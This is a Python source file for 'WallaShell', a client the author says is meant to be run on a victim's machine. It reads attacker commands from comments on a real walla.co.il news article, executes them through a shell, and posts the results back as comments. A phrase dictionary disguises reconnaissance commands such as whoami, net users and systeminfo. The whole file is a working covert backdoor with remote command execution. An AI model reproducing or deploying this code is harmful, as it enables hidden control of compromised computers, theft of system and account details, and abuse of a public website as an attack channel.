# WallaShell.py
# 
# This tool is created to communicate unsuspiciously over the internet.
# It reads commands from article in https://Walla.co.il and posts the output of 
# the command in the subcomment.
# Dictionary is included for "obfuscated" commands from the attacker.
#
# This is the client side, use it on your victim's endpoint and use WallaServerSide.py in
# the server side.
#
# Author: EdenSha 07/06/2021
# --------------------------------------------------------------------------------------------------------------------

# Imports :
import requests
import subprocess
import random
from time import sleep

# globals :
ARTICLE_ID       = "234701"
GET_COMMENTS_URL = "https://dal.walla.co.il/talkback/list/" + ARTICLE_ID + "?type=1&page=1&from=finance.walla.co.il"
POST_COMMENT_URL = "https://dal.walla.co.il/talkback/?from=finance.walla.co.il"
CMD_POS          = 'content'
WRITER           = 'Ani'
FATHER_ID_POS    = 'fatherId'
ID_POS           = 'id'
VICTIM_NAME      = 'victor' + str(random.randint(0,1000))
TIME_TO_SLEEP    = 30  # 5 minutes
CHUNK_SIZE       = 300
CMD_DICTIONARY   = {"Rak Bibi": "ipconfig /ALL",
                    "Right"   : "whoami",
                    "0molan"  : "arp -a",
                    "BBZNOT" : "net users",
                    "Am Israel Live" : "route print",
                    "King BiBi" : "net localgroup administrators",
                    "Make America Great Again" : "systeminfo"}



# Get json of comments from webpage and return a list of command's comments
def getCommands():
    comments = requests.get(GET_COMMENTS_URL)
    commands = [cmd for cmd in comments.json()['data']['list'] if cmd['writer'] == WRITER] 
    return commands


# Execute command and send output in chunks to server
def executeCommand(cmd, id):
    result = subprocess.run( cmd.split(),
                             shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    print(result.stdout)
    output = wrap(result.stdout.decode(), CHUNK_SIZE)

    # Post all command output chunks in sub comments of each command
    for chunk in output:
        r = requests.post(POST_COMMENT_URL, json={"object-id":ARTICLE_ID,
                                                  "type":1,"writer":VICTIM_NAME,
                                                  "content": chunk,
                                                  "father-id":id})
        print(r) #debug



# Split string to chunks because comment size limit 
def wrap(s, w):
    return [s[i:i + w] for i in range(0, len(s), w)]


def main():
    
    already_executed = []

    # Get commands and execute all the time
    while True:
        commands = getCommands()

        # Execute all commands found in page
        for comment in commands:

            # Pass if command already executed
            if comment[ID_POS] not in already_executed:
                cmd = comment[CMD_POS]

                # Check if command in dictionary
                if cmd in CMD_DICTIONARY:
                    executeCommand(CMD_DICTIONARY[cmd], comment[ID_POS])
                else:
                    executeCommand(cmd, comment[ID_POS])

                already_executed.append(comment[ID_POS])
                

        sleep(TIME_TO_SLEEP)

if __name__ == "__main__":
    main()